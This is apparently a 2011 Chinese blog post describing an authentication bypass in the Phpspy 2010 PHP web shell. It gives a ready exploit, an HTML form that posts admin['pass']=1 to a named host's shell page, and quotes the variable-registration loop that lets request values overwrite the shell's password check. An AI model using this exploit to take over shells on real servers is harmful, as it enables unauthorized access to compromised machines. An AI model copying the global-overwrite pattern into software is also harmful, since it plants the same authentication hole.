Phpspy 2010 身份验证绕过漏洞
作者：我不知道该唱什么 发布时间：April 17, 2011 00:21:28 分类：tech


利用代码：

<form method="POST" action="http://mirc.3est.com/1.php">
<input type="hidden" name="admin['pass']" value="1">
<input type="submit" value="Login">
</form>

在每次向shell请求数据的时候 都附加post一个admin['pass']即可。
形成原因：
2009不存在该洞，仅限2010版本，对比二者即可得到答案：
利用

foreach(array('_GET','_POST') as $_request) {
foreach($$_request as $_key => $_value) {
if ($_key{0} != '_') {
if (IS_GPC) {
$_value = s_array($_value);
}
$$_key = $_value;
}
}
}

对变量$admin['pass']进行覆盖。